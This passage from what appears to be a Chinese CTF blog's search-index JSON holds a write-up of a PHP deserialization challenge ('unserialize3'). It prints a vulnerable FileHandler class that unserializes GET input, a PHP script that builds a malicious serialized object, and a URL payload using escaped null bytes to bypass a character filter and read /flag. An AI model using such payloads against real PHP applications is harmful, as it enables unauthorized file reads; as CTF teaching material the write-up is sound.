base64_encode($a);?&gt;//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo= unserialize3私有属性绕过 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phphighlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; ord() 函数返回字符串的首个字符的 ASCII 值。 file_get_contents() 把整个文件读入一个字符串中。 要利用read()的file_get_contents()读取flag.php，即/flag 所以process()的$op==”2”，然后通过output()输出 1234567891011&lt;?phpclass FileHandler &#123; protected $op = 2; protected $filename = &quot;/flag&quot;; protected $content = &quot;Hello World!&quot;;&#125;$a = new FileHandler;$b = serialize($a);echo $b;?&gt; 把输出的$b适当修改，得到payload 1&#x2F;?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;s:5:&quot;&#x2F;flag&quot;;S:10:&quot;\\00*\\00content&quot;;s:12:&quot;Hello%20World!&quot;;&#125;","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]}],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://flag2020.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"其它","slug":"其它","permalink":"https://flag2020.top/categories/%E5%85%B6%E5%AE%83/"},{"name":"比赛writeup","slug":"比赛writeup","permalink":"https://flag2020.top/categories/%E6%AF%94%E8%B5%9Bwriteup/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://flag2020.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"},{"name":"其它","slug":"其它","permalink":"https://flag2020.top/tags/%E5%85%B6%E5%AE%83/"},{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]}